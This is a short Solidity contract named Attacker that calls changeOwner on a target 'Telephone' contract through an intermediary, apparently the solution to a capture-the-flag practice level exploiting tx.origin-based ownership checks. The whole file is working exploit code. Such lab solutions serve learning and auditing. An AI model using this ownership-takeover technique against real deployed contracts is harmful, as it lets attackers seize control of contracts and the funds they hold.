// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attacker {
    ITelephone itelephone;
    constructor(address _telephone) {
        itelephone = ITelephone(_telephone);
    }

    // Call the interface to change the owner for msg.sender
    function changeOwnerAttack() public {
        itelephone.changeOwner(msg.sender);
    }
}